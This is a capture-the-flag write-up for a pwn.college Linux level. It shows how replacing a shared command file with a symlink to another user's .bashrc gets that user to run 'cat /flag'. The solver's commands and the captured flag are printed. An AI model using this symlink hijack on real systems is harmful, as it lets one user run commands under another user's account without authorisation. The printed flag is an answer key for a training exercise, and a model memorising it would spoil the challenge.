### Tricky Linking 

In this challenge, when you run `/challenge/victim`, Zardus will add `cat /flag` to that list of commands:

```console
hacker@dojo:~$ /challenge/victim

Username: zardus
Password: **********
zardus@dojo:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@dojo:~$ exit
logout

hacker@dojo:~$
```

Recall from the previous level that, having write access to `/tmp/collab`, the `hacker` user can replace that `evil-commands.txt` file. Also remember from [Comprehending Commands](https://pwn.college/linux-luminarium/commands) that files can _link_ to other files. What happens if `hacker` replaces `evil-commands.txt` with a symbolic link to some sensitive file that `zardus` can write to? Chaos and shenanigans!

You _know_ the file to link to. Pull off the attack, and get `/flag` (which, for this level, Zardus can read again!).


Command used: 
`rm /tmp/collab/evil-commands.txt`
`ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt`
`/challenge/victim # to write cat /flag to bashrc`
`/challenge/victim # to trigger cat`

flag: `pwn.college{gRDnjihKpBi3dKvLsfdTamxM5qA.0VM0EzNxwyNwkzNyEzW}`
